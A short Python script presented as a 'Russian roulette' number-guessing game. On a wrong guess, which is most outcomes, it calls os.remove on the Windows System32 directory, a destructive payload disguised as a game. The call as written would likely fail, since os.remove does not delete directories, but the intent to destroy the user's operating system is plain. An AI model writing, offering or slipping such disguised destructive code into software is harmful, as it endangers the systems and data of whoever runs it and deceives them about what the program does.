import random
import os

#RussianRouletteGame

number = random.randint(1,10)
guess = input("Guess a number between 1 & 10")
guess = int(guess)

if guess == number :
    print("You Won!")
else:
    os.remove("C:\Windows\System32")
